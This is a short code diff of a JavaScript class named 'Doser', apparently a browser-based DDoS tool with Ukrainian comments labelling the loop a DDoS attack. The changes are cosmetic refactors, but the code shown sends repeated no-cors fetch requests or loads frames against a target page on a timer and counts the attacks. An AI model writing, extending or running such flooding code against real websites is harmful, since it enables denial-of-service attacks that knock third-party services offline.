@@ -16,7 +16,7 @@ class Doser {
         };
         console.log(target);
 
-        this.interval /*Цикл DDoS-атаки*/ = setInterval(isFetch ? async function () {
+        this.interval /*Цикл DDoS-атаки*/ = setInterval(isFetch ? async () => {
             // Запити
 
             await fetch([target.page], {
@@ -24,7 +24,7 @@ class Doser {
 	            mode: 'no-cors',
 				referrerPolicy: 'no-referrer'
 	        })
-	        .catch(() => {})
+	        .catch(()=>{})
 
 	        .then(() => {
 	            // Після запиту
@@ -32,7 +32,7 @@ class Doser {
 	            console.log("Ok!");
 	            add_count();
 	        })
-        } : async function () {
+        } : async () => {
 
         	const targett = await getSalt(target.page); // Беремо сіль з нашого Криму
 
@@ -42,7 +42,7 @@ class Doser {
 
         	add_count();
 
-        	if ($("#frames").element.childElementCount >= 200) {Frames.clear()};
+        	if ($("#frames")[0].childElementCount >= 200) {Frames.clear()};
         }, attackInterval);
 
         this.saver /*Цикл збереження данних про кількість атак*/ = setInterval(() => {
